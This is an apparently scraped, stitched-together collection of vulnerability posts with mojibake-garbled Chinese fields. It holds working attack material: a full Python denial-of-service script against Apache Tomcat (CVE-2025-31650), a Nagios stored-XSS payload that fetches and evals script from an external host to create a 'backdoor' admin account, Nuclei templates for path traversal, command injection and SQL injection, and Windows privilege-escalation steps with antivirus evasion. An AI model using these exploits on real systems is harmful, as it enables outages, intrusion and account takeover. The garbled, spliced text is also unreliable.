shell. 2. Privilege Escalation Use the EfsPotato exploit to abuse SeImpersonatePrivilege. Obfuscate the binary or payload to bypass AV detection. Gain SYSTEM-level shell and create a new Administrator account as proof. Affected Version Timetrax V1 (2025) Mitigation Enforce strong password policies and enable MFA Properly validate and sanitize uploaded files on the server Restrict SeImpersonatePrivilege to required accounts only Apply OS patches to mitigate EfsPotato Disable EFS if not required Disclosure Discovered by: Noman Azam Email: noman@technobiz.com.pk CVE ID: CVE-2025-46157 (Reserved) References EfsPotato Exploit This repository is part of responsible disclosure and educational purposes only. Always follow ethical guidelines and coordinated disclosure policies.

posts.title: Apache Tomcat 10.1.39 - Denial of Service (DOS)
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Apache Tomcat 10.1.39 - Denial of Service (DOS) æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-31650 æ¼æ´ç±»å‹ï¼š æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€  æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š Apache Tomcat 10.1.10è‡³10.1.39ç‰ˆæœ¬ä¸­å­˜åœ¨ä¸€ä¸ªé€šè¿‡æ— æ•ˆHTTP/2ä¼˜å…ˆçº§å¤´å¯¼è‡´çš„å†…å­˜æ³„æ¼æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚ äº§å“å‚å•†ï¼š Apache äº§å“åç§°ï¼š Apache Tomcat å½±å“ç‰ˆæœ¬ï¼š 10.1.10 <= version <= 10.1.39 æ¥æºï¼š https://github.com/assad12341/Dos-exploit- ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ 52318.py README.md æ¥æºæ¦‚è¿°Dos-exploit-CVE-2025-31650 Exploit Title: Apache Tomcat 10.1.39 - Denial of Service (DOS)Author: Abdualhadi khalifaCVE: CVE-2025-31650import httpximport asyncioimport randomimport urllib.parseimport sysimport socketfrom colorama import init, Fore, Style init() class TomcatKiller: def init(self): self.success_count = 0 self.error_count = 0 self.invalid_priorities = [ \"u=-1, q=2\", \"u=4294967295, q=-1\", \"u=-2147483648, q=1.5\", \"u=0, q=invalid\", \"u=1/0, q=NaN\", \"u=1, q=2, invalid=param\", \"\", \"u=1, q=1, u=2\", \"u=99999999999999999999, q=0\", \"u=-99999999999999999999, q=0\", \"u=, q=\", \"u=1, q=1, malformed\", \"u=1, q=, invalid\", \"u=-1, q=4294967295\", \"u=invalid, q=1\", \"u=1, q=1, extra=\", \"u=1, q=1; malformed\", \"u=1, q=1, =invalid\", \"u=0, q=0, stream=invalid\", \"u=1, q=1, priority=recursive\", \"u=1, q=1, %invalid%\", \"u=0, q=0, null=0\", ] async def validate_url(self, url): try: parsed_url = urllib.parse.urlparse(url) if not parsed_url.scheme or not parsed_url.hostname: raise ValueError(\\\"Invalid URL format. Use http:// or https://\\\") host = parsed_url.hostname port = parsed_url.port if parsed_url.port else (443 if parsed_url.scheme == \\\'https\\\' else 80) return host, port except Exception: print(f\\\"{Fore.RED}Error: Invalid URL. Use http:// or https:// format.{Style.RESET_ALL}\\\") sys.exit(1) async def check_http2_support(self, host, port): async with httpx.AsyncClient(http2=True, verify=False, timeout=5, limits=httpx.Limits(max_connections=1000)) as client: try: response = await client.get(f\\\"https://{host}:{port}/\\\", headers={\\\"user-agent\\\": \\\"TomcatKiller\\\"}) if response.http_version == \\\"HTTP/2\\\": print(f\\\"{Fore.GREEN}HTTP/2 supported! Proceeding ...{Style.RESET_ALL}\\\") return True else: print(f\\\"{Fore.YELLOW}Error: HTTP/2 not supported. This exploit requires HTTP/2.{Style.RESET_ALL}\\\") return False except Exception: print(f\\\"{Fore.RED}Error: Could not connect to {host}:{port}.{Style.RESET_ALL}\\\") return False async def send_invalid_priority_request(self, host, port, num_requests, task_id): async with httpx.AsyncClient(http2=True, verify=False, timeout=0.3, limits=httpx.Limits(max_connections=1000)) as client: url = f\\\"https://{host}:{port}/\\\" for i in range(num_requests): headers = { \\\"priority\\\": random.choice(self.invalid_priorities), \\\"user-agent\\\": f\\\"TomcatKiller-{task_id}-{random.randint(1, 1000000)}\\\", \\\"cache-control\\\": \\\"no-cache\\\", \\\"accept\\\": f\\\"*/*; q={random.random()}\\\", } try: await client.get(url, headers=headers) self.success_count += 1 except Exception: self.error_count += 1 async def monitor_server(self, host, port): while True: try: with socket.create_connection((host, port), timeout=2): print(f\\\"{Fore.YELLOW}Target {host}:{port} is reachable.{Style.RESET_ALL}\\\") except Exception: print(f\\\"{Fore.RED}Target {host}:{port} unreachable or crashed!{Style.RESET_ALL}\\\") break await asyncio.sleep(2) async def run_attack(self, host, port, num_tasks, requests_per_task): print(f\\\"{Fore.GREEN}Starting attack on {host}:{port}...{Style.RESET_ALL}\\\") print(f\\\"Tasks: {num_tasks}, Requests per task: {requests_per_task}\\\") print(f\\\"{Fore.YELLOW}Monitor memory manually via VisualVM or check catalina.out for OutOfMemoryError.{Style.RESET_ALL}\\\") monitor_task = asyncio.create_task(self.monitor_server(host, port)) tasks = [self.send_invalid_priority_request(host, port, requests_per_task, i) for i in range(num_tasks)] await asyncio.gather(*tasks) monitor_task.cancel() total_requests = num_tasks * requests_per_task success_rate = (self.success_count / total_requests * 100) if total_requests > 0 else 0 print(f\\\"\\\\n{Fore.MAGENTA}===== Attack Summary ====={Style.RESET_ALL}\\\") print(f\\\"Target: {host}:{port}\\\") print(f\\\"Total Requests: {total_requests}\\\") print(f\\\"Successful Requests: {self.success_count}\\\") print(f\\\"Failed Requests: {self.error_count}\\\") print(f\\\"Success Rate: {success_rate:.2f}%\\\") print(f\\\"{Fore.MAGENTA}========================={Style.RESET_ALL}\\\") async def main(): print(f\"{Fore.BLUE}===== TomcatKiller - CVE-2025-31650 ====={Style.RESET_ALL}\") print(f\"Developed by: @absholi7ly\") print(f\"Exploits memory leak in Apache Tomcat (10.1.10-10.1.39) via invalid HTTP/2 priority headers.\") print(f\"{Fore.YELLOW}Warning: For authorized testing only. Ensure HTTP/2 and vulnerable Tomcat version.{Style.RESET_ALL}\\n\") url = input(f\\\"{Fore.CYAN}Enter target URL (e.g., https://localhost:8443): {Style.RESET_ALL}\\\") num_tasks = int(input(f\\\"{Fore.CYAN}Enter number of tasks (default 300): {Style.RESET_ALL}\\\") or 300) requests_per_task = int(input(f\\\"{Fore.CYAN}Enter requests per task (default 100000): {Style.RESET_ALL}\\\") or 100000) tk = TomcatKiller() host, port = await tk.validate_url(url) if not await tk.check_http2_support(host, port): sys.exit(1) await tk.run_attack(host, port, num_tasks, requests_per_task) if name == \"main\": try: asyncio.run(main()) print(f\"{Fore.GREEN}Attack completed!{Style.RESET_ALL}\") except KeyboardInterrupt: print(f\"{Fore.YELLOW}Attack interrupted by user.{Style.RESET_ALL}\") sys.exit(0) except Exception as e: print(f\"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}\") sys.exit(1) Provide shell access.Install backdoors or persistence mechanisms.Perform any destructive actions.

Severity: CriticalPOC: https://github.com/DrunkenShells/Disclosures/tree/master/CVE-2020-12641-Command%20Injection-Roundcube https://github.com/mbadanoiu/MAL-004 https://github.com/mbadanoiu/CVE-2020-12641 KEV: TrueShodan Query: http.component:"roundcube" Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Such templates are blocked by default and wonâ€™t produce results, so we prioritize creating templates with other protocols unless exceptions are made. Prior to commit c835c6f7799eacada4c0fc77e0816f250af01ad2, insufficient path traversal mechanisms make absolute path traversal possible. This vulnerability allows unauthorized access to sensitive internal files. Commit c835c6f7799eacada4c0fc77e0816f250af01ad2 contains a patch for the issue. reference: - https://github.com/OsamaTaher/Java-springboot-codebase - https://nvd.nist.gov/vuln/detail/CVE-2025-46822 - https://github.com/OsamaTaher/Java-springboot-codebase/security/advisories/GHSA-q6mm-cm37-w637 - https://github.com/OsamaTaher/Java-springboot-codebase/commit/c835c6f7799eacada4c0fc77e0816f250af01ad2 - https://github.com/PuddinCat/GithubRepoSpider classification: epss-score: 0.0214 epss-percentile: 0.83386 metadata: verified: true max-request: 1 tags: cve,cve2025,java,springboot,codebase,lfiflow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 matchers: - type: dsl dsl: - 'contains_any(body, "Whitelabel Error Page","explicit mapping")' internal: true - raw: - | GET /api/v1/files/etc/passwd HTTP/1.1 Host: {{Hostname}} matchers-condition: and matchers: - type: regex part: body regex: - "root:.*:0:0:" - type: status status: - 200

posts.title: WordPress Traffic Monitor Plugin æœªæˆæƒæ¼æ´
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š WordPress Traffic Monitor Plugin æœªæˆæƒæ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-5815 æ¼æ´ç±»å‹ï¼š æœªæˆæƒè®¿é—® æ¼æ´ç­‰çº§ï¼š ä¸­å± æ¼æ´æè¿°ï¼š CVE-2025-5815æ˜¯WordPress Traffic Monitoræ’ä»¶ä¸­çš„ä¸€ä¸ªæœªæˆæƒæ¼æ´ï¼Œå…è®¸è¿œç¨‹æ”»å‡»è€…é€šè¿‡æš´éœ²çš„AJAXåŠ¨ä½œæ— éœ€è®¤è¯å³å¯ç¦ç”¨æœºå™¨äººæ—¥å¿—è®°å½•ã€‚æ­¤æ¼æ´æºäºå¯¹tfcm_set_bot_flags AJAXåŠ¨ä½œç¼ºå°‘è®¤è¯å’Œæˆæƒæ£€æŸ¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ç¯¡æ”¹æ’ä»¶è®¾ç½®ï¼Œç¦ç”¨æœºå™¨äººæ—¥å¿—è®°å½•ï¼Œä»è€Œé€ƒé¿å—å½±å“WordPressç½‘ç«™ä¸Šçš„æ´»åŠ¨ç›‘æ§ã€‚ äº§å“å‚å•†ï¼š WordPress äº§å“åç§°ï¼š Traffic Monitor Plugin å½±å“ç‰ˆæœ¬ï¼š <= 3.2.2 æ¥æºï¼š https://github.com/RootHarpy/CVE-2025-5815-Nuclei-Template ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-5815.yaml README.md æ¥æºæ¦‚è¿°ğŸ“„ Nuclei Template for CVE-2025-5815ğŸš€ OverviewThis repository features a Nuclei template specifically designed to detect an Unauthenticated Bot Logging Disable Vulnerability (CVE-2025-5815) in the Traffic Monitor WordPress plugin. This issue allows unauthenticated attackers to remotely disable bot logging via a vulnerable AJAX action. ğŸ” Vulnerability DescriptionCVE-2025-5815 arises from missing authentication and authorization checks on the tfcm_set_bot_flags AJAX action in the Traffic Monitor plugin for WordPress. This allows remote attackers to tamper with plugin settings, disabling bot logging without requiring login credentials â€” leading to evasion of activity monitoring on affected WordPress sites. ğŸ›‘ Affected Versions Traffic Monitor Plugin: Versions up to and including 3.2.2 ğŸ“Š CVSS Score Base Score: 5.3 (Medium) ğŸ·ï¸ CVSS Vector CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N ğŸ“‹ Template DetailsThis Nuclei template attempts to exploit the vulnerable AJAX endpoint by sending an unauthenticated request to admin-ajax.php with the action=tfcm_set_bot_flags parameter and checks for a success confirmation in the response body. ğŸ› ï¸ Usage InstructionsTo use this template with Nuclei, make sure Nuclei is installed on your system. Then run the following command: 1nuclei -t path/to/CVE-2025-5815.yaml -u <target_url> Replace path/to/CVE-2025-5815.yaml with the actual path to your template file and <target_url> with the target website URL. ğŸ‘¤ AuthorThis template was developed by RootHarpy. For inquiries, collaboration, or contributions, feel free to connect via GitHub.

posts.text: é“¾æ¥ï¼š https://github.com/advisories/GHSA-hqr5-32x6-7hw9 CVSS è¯„åˆ†ï¼š 9.8 å‚è€ƒé“¾æ¥ï¼š https://nvd.nist.gov/vuln/detail/CVE-2025-5288 https://plugins.trac.wordpress.org/browser/import-export-with-custom-rest-api/tags/2.0.3/backend/methods/wot-rapi-import-functions.php#L123 https://wordpress.org/plugins/import-export-with-custom-rest-api/#developers https://www.wordfence.com/threat-intel/vulnerabilities/id/0e2774fc-f028-436c-a8af-3c17378b9743?source=cve https://github.com/advisories/GHSA-hqr5-32x6-7hw9 æè¿°ï¼š The REST API | Custom API Generator For Cross Platform And Import Export In WP plugin for WordPress is vulnerable to Privilege Escalation due to a missing capability check on the process_handler() function in versions 1.0.0 to 2.0.3. This makes it possible for unauthenticated attackers to POST an arbitrary import_api URL, import specially crafted JSON, and thereby create a new user with full Administrator privileges.

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Nagios Log Server å­˜å‚¨å‹è·¨ç«™è„šæœ¬æ¼æ´ï¼ˆæƒé™æå‡è‡³ç®¡ç†å‘˜ï¼‰ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-29471 æ¼æ´ç±»å‹ï¼š è·¨ç«™å¯æ‰§è¡Œè„šæœ¬ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Nagios Log Server 2024R1.3.1ä¸­å­˜åœ¨ä¸€ä¸ªå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼ˆXSSï¼‰æ¼æ´ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·åœ¨å…¶ä¸ªäººèµ„æ–™çš„â€™emailâ€™å­—æ®µä¸­æ³¨å…¥æ¶æ„JavaScriptä»£ç ã€‚å½“ç®¡ç†å‘˜æŸ¥çœ‹å®¡è®¡æ—¥å¿—æ—¶ï¼Œè¯¥è„šæœ¬ä¼šæ‰§è¡Œï¼Œå¯¼è‡´é€šè¿‡æœªç»æˆæƒçš„ç®¡ç†å‘˜è´¦æˆ·åˆ›å»ºå®ç°æƒé™æå‡ã€‚åœ¨æŸäº›é…ç½®ä¸‹ï¼Œè¯¥æ¼æ´å¯è¢«ä¸²è”åˆ©ç”¨ä»¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰ã€‚ äº§å“å‚å•†ï¼š Nagios äº§å“åç§°ï¼š Nagios Log Server å½±å“ç‰ˆæœ¬ï¼š 2024R1.3.1åŠä»¥ä¸‹ç‰ˆæœ¬ æ¥æºï¼š https://github.com/skraft9/CVE-2025-29471 ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ README.md æ¥æºæ¦‚è¿°Stored XSS Vulnerability in Nagios Log Server (Privilege Escalation to Admin)Date: 2025-04-02Exploit Author: Seth KraftVendor Homepage: https://www.nagios.com/Vendor Changelog: https://www.nagios.com/changelog/#log-serverSoftware Link: https://www.nagios.com/products/log-server/download/Version: 2024R1.3.1 and belowTested On: Nagios Log Server 2024R1.3.1 (default configuration, Ubuntu 20.04)CWE: CWE-79, CWE-352, CWE-285, CWE-269, CWE-602CVSS: 9.3 (CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:R/S:C/VC:H/VI:H/VA:H)Type: Stored Cross-Site Scripting (XSS), Privilege EscalationExploit Risk: CriticalDisclosureFor research and authorized testing only. Do not use against systems without permission. Description:A stored XSS vulnerability in Nagios Log Server 2024R1.3.1 allows a low-privileged user to injectmalicious JavaScript into the â€˜emailâ€™ field of their profile. When an administrator views the audit logs,the script executes, resulting in privilege escalation via unauthorized admin account creation.The vulnerability can be chained to achieve remote code execution (RCE) in certain configurations. PoC Log in as a standard (non-admin) user. Navigate to the profile update endpoint: http://<target-ip>/nagioslogserver/profile/update Inject the following payload into the email field: 123456<script>fetch("https://<EXTERNAL-HOST>/xss.js") .then(response => response.text()) .then(scriptText => eval(scriptText)) .catch(console.error);</script> Host the xss.js payload on your external server with the following content: 12345678910111213141516171819202122232425(function() { var csrfTokenMatch = document.cookie.match(/csrf_ls=([^;]+)/); if (!csrfTokenMatch) return; var csrfToken = encodeURIComponent(csrfTokenMatch[1]); var requestBody = "csrf_ls=" + csrfToken + "&name=backdoor" + "&email=hacker@example.com" + "&username=backdoor" + "&password=Password123!" + "&password2=Password123!" + "&auth_type=admin" + "&apiaccess=1" + "&language=en_US" + "&account_type=local"; fetch("http://<target-ip>/nagioslogserver/admin/users/create", { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: requestBody }) .then(response => response.text()) .then(console.log) .catch(console.error);})(); Wait for an administrator to view the audit logs. The JavaScript will execute, creating a new admin account: Username: backdoorPassword: Password123!

posts.title: Windows Disk Cleanup Tool Elevation of Privilege Vulnerability
posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Windows Disk Cleanup Tool Elevation of Privilege Vulnerability æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-21420 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š Windows Disk Cleanup Toolä¸­å­˜åœ¨ä¸€ä¸ªæƒé™æå‡æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡ç‰¹å®šçš„æŠ€æœ¯æ‰‹æ®µæå‡è‡³SYSTEMæƒé™ã€‚è¯¥æ¼æ´æ¶‰åŠcleanmgr.exeæ–‡ä»¶çš„SilentCleanupä»»åŠ¡ï¼Œè¯¥ä»»åŠ¡ä»¥æœ€é«˜æƒé™è¿è¡Œï¼Œä¸”å­˜åœ¨ä»»æ„æ–‡ä»¶å¤¹åˆ é™¤/ç§»åŠ¨/é‡å‘½åæ¼æ´ï¼Œå¯ä»¥è¢«é‡å®šå‘è‡³C:/Config.msiæ–‡ä»¶å¤¹ï¼Œè¿›è€Œå®ç°æƒé™æå‡ã€‚ äº§å“å‚å•†ï¼š Microsoft äº§å“åç§°ï¼š Windows Disk Cleanup Tool æ¥æºï¼š https://github.com/moiz-2x/CVE-2025-21420_POC ç±»å‹ï¼š CVE-2025:github search ä»“åº“æ–‡ä»¶ CVE-2025-21420_POC.py README.md images æ¥æºæ¦‚è¿°Diffing cleanmgr.exeThe new version of cleanmgr.exe includes a call to the SetProcessMitigationPolicy function. With MitigationPolicy set to 16, corresponding to ProcessRedirectionTrustPolicy. Combined with Microsoftâ€™s description of CWE-59: Improper Link Resolution Before File Access (â€˜Link Followingâ€™), we can infer that cleanmgr.exe has Redirection Guard enabled. After reading two blog posts by Simon Zuckerbraun and enigma0x3: From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP Bypass UAC The SilentCleanup task may have sufficient privileges to delete the C:/Config.msi folder, as mentioned by Simon Zuckerbraun. We only need to locate an Arbitrary Folder Delete/Move/Rename vulnerability inside the SilentCleanup task (which runs cleanmgr.exe with Run with highest priv) and redirect it to the C:/Config.msi folder. Observations via ProcmonRun the SilentCleanup task and observe cleanmgr.exe behavior. The process checks whether the listed folders exist (interestingly, it doesnâ€™t verify if C:\ESD is a junction, but it does check Windows and Download â€” which we wonâ€™t dive into here). Create the folders C:\$Windows.~WS, C:\ESD\Windows, C:\ESD\Download, drop some random files into them, rerun SilentCleanup and observe again. We can see SilentCleanup deletes the contents within the Windows and Download folders. This can be leveraged using the technique described in From Folder Contents Delete to SYSTEM EoP. Exploit Python script creates 3 folders: C:\$Windows.~WS, C:\ESD\Windows, C:\ESD\Download, inserts dummy .txt files and pauses. Run FolderOrFileDeleteToSystem to set up the Config.msi. Run FolderContentsDeleteToFolderDelete to redirect content cleanup from C:\ESD\Windows to C:/Config.msi.Note: Exclude these two processes in Defender as AV may detect this exploit technique. Resume the Python script and run SilentCleanup to trigger content cleanup. Run osk.exe, then hit Ctrl-Alt-Delete.

Severity: CriticalPOC: http://packetstormsecurity.com/files/157054/Oracle-Coherence-Fusion-Middleware-Remote-Code-Execution.html http://packetstormsecurity.com/files/157207/Oracle-WebLogic-Server-12.2.1.4.0-Remote-Code-Execution.html http://packetstormsecurity.com/files/157795/WebLogic-Server-Deserialization-Remote-Code-Execution.html https://github.com/Qynklee/POC_CVE-2020-2555 https://vulncheck.com/xdb/1003dc67ff34 https///github.com:Qynklee/POC_CVE-2020-2555.git https://vulncheck.com/xdb/6179b4e1d51c https///github.com:Y4er/WebLogic-Shiro-shell.git https://vulncheck.com/xdb/235a5c344d3f https///gitee.com:chenjiew/CVE-2020-2555.git https://vulncheck.com/xdb/322326255843 https///gitee.com:mstir/CVE-2020-2555.git https://github.com/Maskhe/cve-2020-2555 https://github.com/Y4er/CVE-2020-2555 https://vulncheck.com/xdb/2c95cddac1b5 https///github.com:Y4er/CVE-2020-2555.git https://github.com/wsfengfan/CVE-2020-2555 https://vulncheck.com/xdb/e667362e551e https///github.com:wsfengfan/CVE-2020-2555.git https://github.com/Hu3sky/CVE-2020-2555 https://vulncheck.com/xdb/c9e0223955e2 https///github.com:0xn0ne/weblogicScanner.git KEV: TrueShodan Query: http.title:"oracle access management" Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and wonâ€™t produce results, so we prioritize creating templates with other protocols unless exceptions are made. posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š Evertz SDVN 3080ipx-10G æœªæˆæƒä»»æ„å‘½ä»¤æ³¨å…¥æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2025-4009 æ¼æ´ç±»å‹ï¼š å‘½ä»¤æ‰§è¡Œ æ¼æ´ç­‰çº§ï¼š ä¸¥é‡ æ¼æ´æè¿°ï¼š Evertz SDVN 3080ipx-10Gæ˜¯ä¸€æ¬¾ç”¨äºè§†é¢‘åº”ç”¨çš„é«˜å¸¦å®½ä»¥å¤ªç½‘äº¤æ¢ç»“æ„ã€‚è¯¥è®¾å¤‡åœ¨80ç«¯å£æš´éœ²äº†ä¸€ä¸ªWebç®¡ç†ç•Œé¢ï¼Œç®¡ç†å‘˜å¯ä»¥é€šè¿‡æ­¤ç•Œé¢æ§åˆ¶äº§å“åŠŸèƒ½ã€è®¾ç½®ç½‘ç»œäº¤æ¢å’Œæ³¨å†Œè®¸å¯è¯ç­‰åŠŸèƒ½ã€‚è¯¥åº”ç”¨ä½¿ç”¨PHPå¼€å‘ï¼Œé‡‡ç”¨äº†webEASY SDKï¼ˆä¹Ÿç§°ä¸ºEvertzçš„â€™ewbâ€™ï¼‰ã€‚æ­¤Webç•Œé¢æœ‰ä¸¤ä¸ªç«¯ç‚¹å­˜åœ¨ä»»æ„å‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œä¸”è®¤è¯æœºåˆ¶å­˜åœ¨ç¼ºé™·å¯¼è‡´è®¤è¯ç»•è¿‡ã€‚æœªç»è®¤è¯çš„è¿œç¨‹æ”»å‡»è€…å¯ä»¥åœ¨å—å½±å“çš„è®¾å¤‡ä¸Šä»¥æå‡çš„æƒé™ï¼ˆrootï¼‰æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¿™ç§è®¿é—®çº§åˆ«å¯èƒ½å¯¼è‡´ä¸¥é‡çš„ä¸šåŠ¡å½±å“ï¼Œå¦‚åª’ä½“æµä¸­æ–­ã€æµåª’ä½“ä¿®æ”¹ã€ç”Ÿæˆçš„å­—å¹•æ›´æ”¹ç­‰ã€‚ äº§å“å‚å•†ï¼š Evertz äº§å“åç§°ï¼š SDVN 3080ipx-10G æœç´¢è¯­æ³•ï¼š html:â€evertz.min.cssâ€ æ¥æºï¼š https://github.com/projectdiscovery/nuclei-templates/blob/042b0f70cb08d6661d99a67148a9f2d735c96bc9/http%2Fcves%2F2025%2FCVE-2025-4009.yaml ç±»å‹ï¼š projectdiscovery/nuclei-templates:github issues POCè¯¦æƒ…1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556id: CVE-2025-4009info: name: Evertz SDVN 3080ipx-10G - Unauthenticated Arbitrary Command Injection author: ONEKEY,iamnoooob,pdresearch severity: critical description: | The Evertz SDVN 3080ipx-10G is a High Bandwidth Ethernet Switching Fabric for Video Application. This device exposes a web management interface on port 80. This web management interface can be used by administrators to control product features, setup network switching, and register license among other features. The application has been developed in PHP with the webEASY SDK, also named â€˜ewbâ€™ by Evertz.This web interface has two endpoints that are vulnerable to arbitrary command injection and the authentication mechanism has a flaw leading to authentication bypass.Remote unauthenticated attackers can gain arbitrary command execution with elevated privileges ( root ) on affected devices.This level of access could lead to serious business impact such as the interruption of media streaming, modification of media being streamed, alteration of closed captions being generated, among others. reference: - https://www.onekey.com/resource/security-advisory-remote-code-execution-on-evertz-svdn-cve-2025-4009 classification: cvss-metrics: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/S:N/AU:Y/V:C cvss-score: 9.3 epss-score: 0.00242 epss-percentile: 0.47604 metadata: verified: true max-request: 1 shodan-query: html:"evertz.min.css" tags: cve,cve2025,evertz,rce,unauthvariables: payload: '{"user": {"name": "admin", "login": "admin"},"role":{"name":"administrator", "restrictions": [],"deleteable": false}}'http: - raw: - | GET /login.php?authorized={{base64(payload)}} HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - 'contains_all(body, "PHPSESSID","webeasy-loggedin","index.php")' - 'status_code == 200' condition: and internal: true - raw: - | GET /v.1.5/php/features/feature-transfer-export.php?action=id;&filename=&varid=&slot= HTTP/1.1 Host: {{Hostname}} redirects: true matchers-condition: and matchers: - type: word part: body words: - "uid=" - "gid=" condition: and

posts.text: æ¼æ´ä¿¡æ¯æ¼æ´åç§°ï¼š CLFS æƒé™æå‡æ¼æ´ æ¼æ´ç¼–å·ï¼š CVEï¼š CVE-2024-49138 æ¼æ´ç±»å‹ï¼š æƒé™æå‡ æ¼æ´ç­‰çº§ï¼š é«˜å± æ¼æ´æè¿°ï¼š è¯¥æ¼æ´å…è®¸æ”»å‡»è€…é€šè¿‡å¤–éƒ¨RDPå…¥ä¾µå¼€å§‹ï¼Œåˆ©ç”¨ä¸€ä¸ªå…¨æ–°çš„CLFSæƒé™æå‡æ¼æ´ï¼ˆCVE-2024-49138ï¼‰ï¼Œæœ€ç»ˆå®ç°SYSTEMçº§åˆ«çš„äº‘å‡­è¯æ”¶é›†ã€‚ äº§å“åç§°ï¼š CLFS æ¥æºï¼š https://github.com/onixgod/SOC335-Event-ID-313-CVE-2024-49138-Exploitation-Detected--Lest-Defend-Writeup ç±»å‹ï¼š CVE-2024:github search ä»“åº“æ–‡ä»¶ README.md æ¥æºæ¦‚è¿°SOC335-Event-ID-313-CVE-2024-49138-Exploitation-Detectedâ€“Lest-Defend-WriteupIn this lab I walked through an end-to-end intrusion that began with an external RDP break-in, used a brand-new CLFS privilege-escalation exploit (CVE-2024â€“49138), and ended with SYSTEM-level cloud credential harvesting. Below is the story, the evidence, and the lessons I drew from it.

This flaw allows remote unauthenticated attackers to execute arbitrary SQL queries via the 's' query parameter in a POST request. reference: - https://nvd.nist.gov/vuln/detail/CVE-2024-33559 - https://xstore.8theme.com/ - https://github.com/absholi7ly/WordPress-XStore-theme-SQL-Injection - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33559 - https://sploitus.com/exploit?id=EDB-ID:52019 classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L cvss-score: 9.3 cve-id: CVE-2024-33559 cwe-id: CWE-89 epss-score: 0.03565 epss-percentile: 0.87175 tags: cve,cve2024,wordpress,xstore,sqli,wp,demoflow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers: - type: dsl dsl: - 'contains(body,"Copyright") && contains(body,"XStore Theme")' - "status_code == 200" condition: and internal: true - raw: - | POST /?s=%27%3B+SELECT+*+FROM+wp_posts%3B+-- HTTP/1.1 Host: {{Hostname}} matchers: - type: word part: body words: - "WordPress database error" - "You have an error in your SQL syntax" condition: or
